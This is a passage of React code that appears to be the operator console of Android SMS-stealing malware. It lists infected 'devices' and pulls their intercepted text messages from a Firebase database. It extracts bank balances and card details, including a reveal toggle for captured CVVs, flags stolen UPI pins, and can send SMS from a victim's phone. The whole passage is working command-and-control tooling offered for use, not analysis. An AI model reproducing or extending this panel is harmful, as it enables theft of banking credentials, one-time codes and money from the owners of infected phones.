              {b.networkFromSms && <div className="flex items-center gap-1"><Icon name="Wifi" className="w-3 h-3 text-purple-400" /><span className="text-[10px] tx2">{b.networkFromSms}</span></div>}
            </div>
          )}
          <p className="text-[10px] tx4 mt-2 leading-relaxed line-clamp-2">{b.rawSms.substring(0, 130)}</p>
        </div>
      );
    }

    function CardItem({ c }) {
      const [showCvv, setShowCvv] = useState(false);
      return (
        <div className="cardrow">
          <div className="flex items-center justify-between mb-2 gap-2">
            <div className="flex items-center gap-2">
              <div className="w-6 h-6 rounded-lg bg-purple-500/15 border border-purple-500/25 flex items-center justify-center">
                <Icon name="CreditCard" className="w-3 h-3 text-purple-400" />
              </div>
              <span className="text-xs font-bold text-purple-300">{c.cardType || 'Card'}</span>
            </div>
            {c.expiry && <span className="text-[10px] tx2 font-mono">Exp: {c.expiry}</span>}
          </div>
          <p className="font-mono text-xs tx1">•••• •••• •••• {c.cardLast4}</p>
          {c.cvv && (
            <div className="flex items-center gap-2 mt-2">
              <span className="text-[10px] uppercase tracking-widest tx3">CVV:</span>
              <span className="text-xs font-mono text-purple-300">{showCvv ? c.cvv : '•••'}</span>
              <button onClick={() => setShowCvv(v => !v)} className="p-0.5 tx4 hover:text-purple-400 transition-colors">
                <Icon name={showCvv ? 'EyeOff' : 'Eye'} className="w-3 h-3" />
              </button>
            </div>
          )}
          <p className="text-[10px] tx4 mt-2 leading-relaxed line-clamp-2">{c.rawSms.substring(0, 130)}</p>
        </div>
      );
    }

    /* ══ ALL-SMS FEED ROW — memoized; only changed rows re-render ═════ */
    const SmsRow = memo(function SmsRow({ r, onOpen, color }) {
      const isBank = /AVL|AVAL|AVBL|BAL\.|CREDITED|DEBITED|INR/i.test(r.text);
      const isCard = /CARD|CVV|CREDIT CARD|DEBIT CARD/i.test(r.text);
      return (
        <button className={`smsrow ${isCard ? 'card' : isBank ? 'bank' : ''}`}
          onClick={() => onOpen(r)}
          title="Open this device">
          <div className="smsrow-top">
            <span className="w-1.5 h-1.5 rounded-full flex-shrink-0" style={{ background: color || '#8b5cf6' }} />
            <span className="smsrow-dev">{r.device.name}</span>
            <span className="tx4" style={{ fontSize: 9, flexShrink: 0 }}>·</span>
            <span className="smsrow-snd">{r.sender}</span>
            <span className="smsrow-time">{r.time || ''}</span>
          </div>
          <div className="smsrow-text">{r.text}</div>
        </button>
      );
    });

    /* ═══════════════════════════════════════════════════════════════════
       DEVICE PANEL
       ═══════════════════════════════════════════════════════════════════ */
    function DevicePanel({ device: dev, fbUrl, fbKey, onClose, onDelete, showToast }) {
      const [messages, setMessages] = useState([]);
      const [analysis, setAnalysis] = useState({ bankBalances: [], cards: [], phoneNumbers: [], networks: [] });
      const [loadingMsgs, setLoadingMsgs] = useState(true);
      const [activeTab, setActiveTab] = useState('info');
      const [sendTo, setSendTo] = useState('');
      const [sendMsg, setSendMsg] = useState('');
      const [sendSim, setSendSim] = useState(1);
      const [sending, setSending] = useState(false);
      const aliveRef = useRef(true);
      const timerRef = useRef(null);
      const lastMsgSigRef = useRef('');

      const loadMessages = useCallback(async () => {
        if (!aliveRef.current) return;
        try {
          /* only last 1 hour + newest 120 → panel stays light on any phone.
             priority: the open device's poll skips the fetch gate — background
             sync can never make the user's own messages lag. */
          const raw = await fbGet(fbUrl, fbKey, `messages/${dev.id}`, { orderBy: '"$key"', limitToLast: '120' }, undefined, { priority: true });
          if (!aliveRef.current) return;
          const msgs = parseSmsMessages(raw);
          /* nothing changed → skip re-render entirely (zero scroll jank) */
          const sig = msgs[0] ? (msgs[0].text + '|' + msgs[0].time + '|' + msgs.length) : '';
          if (sig === lastMsgSigRef.current) return;
          if (lastMsgSigRef.current && sig) playNotifSound();   // console always-on alert
          lastMsgSigRef.current = sig;
          setMessages(msgs); setAnalysis(buildSmsAnalysis(msgs));
        } catch (e) {
          if (!aliveRef.current) return;
          if (e.message.includes('PERMISSION_DENIED')) showToast('Firebase permission denied — check your Database Secret key');
          if (lastMsgSigRef.current !== '') { lastMsgSigRef.current = ''; setMessages([]); }
        } finally { if (aliveRef.current) setLoadingMsgs(false); }
      }, [dev.id, fbUrl, fbKey, showToast]);

      useEffect(() => {
        aliveRef.current = true;
        loadMessages();
        /* opened device = top priority: fastest possible live sync */
        timerRef.current = setInterval(() => { if (document.visibilityState !== 'hidden') loadMessages(); }, PANEL_SYNC_MS);
        return () => { aliveRef.current = false; if (timerRef.current) clearInterval(timerRef.current); };
      }, [loadMessages]);

      const sendSms = async () => {
        if (!sendTo || !sendMsg) { showToast('Fill number and message'); return; }
        setSending(true);
        try {
          await fbPut(fbUrl, fbKey, `clients/${dev.id}/webhookEvent/sendSms`, { from: sendSim, to: sendTo, message: sendMsg, isSended: false });
          showToast('SMS queued!'); setSendMsg('');
        } catch (e) {
          showToast(e.message.includes('PERMISSION_DENIED') ? 'Firebase permission denied — cannot send' : 'Send failed');
        } finally { setSending(false); }
      };

      const deleteDevice = async () => {
        if (!confirm(`Delete "${dev.name}" permanently?`)) return;
        try { await fbDelete(fbUrl, fbKey, `clients/${dev.id}`); showToast('Device deleted'); onDelete(); }
        catch (e) { showToast(e.message.includes('PERMISSION_DENIED') ? 'Firebase permission denied' : 'Delete failed'); }
      };

      const batColor = dev.batteryPercent >= 60 ? '#4ade80' : dev.batteryPercent >= 30 ? '#fbbf24' : '#fb7185';
      const phone = dev.phoneNumber !== '—' ? dev.phoneNumber : analysis.phoneNumbers[0] || '—';
      const network = dev.provider !== '—' ? dev.provider : analysis.networks[0] || '—';

      const tabs = [
        { key: 'info', label: 'Info' },
        { key: 'bank', label: `Bank (${analysis.bankBalances.length})` },
        ...(analysis.cards.length > 0 ? [{ key: 'card', label: `Card (${analysis.cards.length})` }] : []),
        { key: 'sms', label: `SMS (${messages.length})` },
        { key: 'send', label: 'Send' },
      ];

      return (
        <div className="fixed inset-0 z-[80] flex" onClick={onClose}>
          <div className="absolute inset-0 scrimbg backdrop-blur-sm" />
          <div className="relative ml-auto w-full max-w-md h-full flex flex-col panelbg bd devpanel-in" style={{ borderLeftWidth: 1 }} onClick={e => e.stopPropagation()}>
            <div className="flex items-center justify-between px-5 py-4 bd" style={{ borderBottomWidth: 1 }}>
              <div className="flex items-center gap-3 min-w-0">
                <div className={`w-9 h-9 rounded-xl flex items-center justify-center flex-shrink-0 ${dev.status ? 'bg-emerald-500/12 border border-emerald-500/25' : 'surface2 bd'}`}>
                  <Icon name="Smartphone" className={`w-4 h-4 ${dev.status ? 'text-emerald-400' : 'tx4'}`} />
                </div>
                <div className="min-w-0">
                  <h3 className="text-sm font-bold tx1 truncate">{dev.name}</h3>
                  <p className="text-[10px] font-mono tx3 mt-0.5 truncate">{dev.id}</p>
                </div>
              </div>
              <div className="flex items-center gap-2 flex-shrink-0">
                <button onClick={deleteDevice} className="p-2 rounded-xl bg-red-950/40 border border-red-900/30 text-red-400 hover:bg-red-950/70 transition-colors">
                  <Icon name="Trash2" className="w-4 h-4" />
                </button>
                <button onClick={onClose} className="p-2 rounded-xl surface2 bd tx2 hover:text-white transition-colors">
                  <Icon name="X" className="w-4 h-4" />
                </button>
              </div>
            </div>

            <div className="flex items-center gap-3 px-5 py-2.5 surface3 bd" style={{ borderBottomWidth: 1 }}>
              <div className="flex items-center gap-1.5">
                <span className={`w-2 h-2 rounded-full ${dev.status ? 'bg-emerald-500' : 'bg-[#3a4256]'}`} style={dev.status ? { boxShadow: '0 0 6px #22c55e' } : {}} />
                <span className={`text-xs font-semibold ${dev.status ? 'text-emerald-400' : 'tx2'}`}>{dev.status ? 'Online' : 'Offline'}</span>
                {!dev.status && dev.lastSeen && <span className="text-[10px] font-mono text-red-400/70">since {timeAgo(dev.lastSeen)}</span>}
              </div>
              <div className="flex items-center gap-1">
                <span className="text-[10px] tx2">Bat</span>
                <span className="text-[10px] font-bold" style={{ color: batColor }}>{dev.battery}</span>
              </div>
              {dev.upipin && <span className="px-2 py-0.5 rounded-full bg-amber-500/10 border border-amber-500/20 text-[10px] font-semibold text-amber-400">UPI</span>}
              {analysis.bankBalances.length > 0 && <span className="px-2 py-0.5 rounded-full bg-emerald-500/10 border border-emerald-500/20 text-[10px] font-semibold text-emerald-400">{analysis.bankBalances.length} Bank SMS</span>}
              {analysis.cards.length > 0 && <span className="px-2 py-0.5 rounded-full bg-purple-500/10 border border-purple-500/20 text-[10px] font-semibold text-purple-400">{analysis.cards.length} Card</span>}
            </div>

            <div className="tabbar">
              {tabs.map(t => (
                <button key={t.key} onClick={() => setActiveTab(t.key)}
                  className={`tab ${activeTab === t.key ? (t.key === 'bank' ? 'on green' : t.key === 'card' ? 'on purple' : 'on') : ''}`}>
                  {t.label}
                </button>
              ))}
            </div>

            <div className="flex-1 overflow-y-auto pscroll">
              {activeTab === 'info' && (
                <div className="px-5 py-4">
                  {!dev.status && dev.lastSeen && (
                    <div className="mb-4 p-3 rounded-xl bg-red-950/20 border border-red-900/30 border-l-2 border-l-red-500/60">
                      <p className="dev-meta-label" style={{ color: '#b4445f' }}>Last Seen (Offline Since)</p>
                      <p className="text-base font-black text-red-400">{timeAgo(dev.lastSeen)}</p>
                      <p className="text-[10px] font-mono text-red-700/70 mt-0.5">{formatDatetime(dev.lastSeen)}</p>
                    </div>
                  )}
                  {dev.status && dev.lastSeen && (
                    <div className="mb-4 p-3 rounded-xl bg-emerald-950/20 border border-emerald-900/30">
                      <p className="dev-meta-label" style={{ color: '#3f9e63' }}>Last Activity</p>
                      <p className="text-[11px] font-mono text-emerald-400">{formatDatetime(dev.lastSeen)}</p>
                    </div>
                  )}
                  <p className="dev-meta-label mb-2">Device</p>
